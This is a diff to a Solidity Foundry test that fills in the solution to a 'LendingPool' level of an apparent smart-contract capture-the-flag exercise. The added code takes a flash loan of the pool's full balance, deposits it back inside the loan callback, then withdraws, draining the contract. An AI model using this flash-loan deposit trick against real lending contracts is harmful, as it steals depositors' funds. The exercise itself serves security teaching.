@@ -5,21 +5,29 @@ import "./BaseTest.t.sol";
 import "src/08_LendingPool/LendingPool.sol";
 
 // forge test --match-contract LendingPoolTest -vvvv
-contract LendingPoolTest is BaseTest {
+contract LendingPoolTest is BaseTest, IFlashLoanReceiver {
     LendingPool instance;
+    uint256 public amountToSteal = 0.1 ether;
 
     function setUp() public override {
         super.setUp();
         instance = new LendingPool{value: 0.1 ether}();
     }
 
-    function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+    function execute() external payable override {
+        instance.deposit{value: 0.1 ether}();
+    }
 
+    function testExploitLevel() public {
+        instance.flashLoan(address(instance).balance);
+        instance.withdraw();
         checkSuccess();
     }
 
     function checkSuccess() internal view override {
-        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
+        assertTrue(
+            address(instance).balance == 0,
+            "Solution is not solving the level"
+        );
     }
 }
